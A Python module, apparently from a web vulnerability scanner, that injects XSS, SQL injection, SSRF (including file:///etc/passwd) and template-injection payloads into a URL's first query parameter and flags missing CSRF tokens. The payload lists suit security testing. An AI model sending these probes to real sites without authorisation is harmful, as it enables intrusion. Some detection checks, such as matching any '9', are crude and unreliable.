import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
import time
from modules.results_manager import save_result, logging

HEADERS = {"User-Agent": "Mozilla"}

XSS_PAYLOAD = "<script>alert(1)</script>"
SQLI_PAYLOADS = ["'", "' OR 1=1 --", "' AND sleep(3)--", "\" OR \"\"=\""]
SSRF_PAYLOADS = ["http://127.0.0.1", "file:///etc/passwd"]
SSTI_PAYLOADS = [
    "{{7*7}}", "{{3*3}}", "{{3*'3'}}", "<%= 3 * 3 %>",
    "${6*6}", "${{3*3}}", "@(6+5)", "#{3*3}",
    "{{ self }}", "{{ request }}", "{{ config.items() }}",
    "{{ [].class.base.subclasses() }}",
    "{{ ''.__class__.__mro__[2].__subclasses__() }}"
]

def select_parameter(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return None, None
    param_key = list(params.keys())[0]  # 첫 번째 파라미터 자동 선택 (변경 가능)
    return parsed, param_key

def inject_selected_param(parsed, param_key, payload):
    params = parse_qs(parsed.query)
    params[param_key] = payload
    query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=query))

def test_payloads(url, param_key, payloads, check_func, vuln_type):
    results = []
    parsed = urlparse(url)

    for payload in payloads:
        test_url = inject_selected_param(parsed, param_key, payload)
        try:
            res = requests.get(test_url, headers=HEADERS, timeout=10)
            if check_func(res, payload):
                results.append({"url": test_url, "payload": payload, "type": vuln_type})
        except Exception as e:
            logging.error(f"{vuln_type} Request error: {test_url} - {e}")
    return results

def run(full_url):
    results = []

    parsed, param_key = select_parameter(full_url)
    if not param_key:
        logging.error("No query parameters found for vulnerability scanning.")
        return

    # XSS
    results += test_payloads(full_url, param_key, [XSS_PAYLOAD],
                             lambda res, p: p in res.text, "XSS")

    # SQLi
    def check_sqli(res, payload):
        return ("sql" in res.text.lower() or
                "syntax" in res.text.lower() or
                res.elapsed.total_seconds() > 3)

    results += test_payloads(full_url, param_key, SQLI_PAYLOADS, check_sqli, "SQLi")

    # SSRF
    results += test_payloads(full_url, param_key, SSRF_PAYLOADS,
                             lambda res, p: res.status_code == 200 and "127.0.0.1" in res.text, "SSRF")

    # SSTI
    results += test_payloads(full_url, param_key, SSTI_PAYLOADS,
                             lambda res, p: "49" in res.text or "9" in res.text, "SSTI")

    # CSRF 별도 (파라미터 필요 없음)
    try:
        res = requests.get(full_url, headers=HEADERS, timeout=5)
        soup = BeautifulSoup(res.text, "lxml")
        forms = soup.find_all("form", method=True)
        csrf_missing = any(
            form.get("method", "").lower() == "post" and
            not any("csrf" in (i.get("name") or "").lower() for i in form.find_all("input"))
            for form in forms
        )
        if csrf_missing:
            results.append({"url": full_url, "type": "CSRF", "detail": "CSRF token missing in POST form"})
    except Exception as e:
        logging.error(f"CSRF check error: {full_url} - {e}")

    save_result("vuln_scan", results)
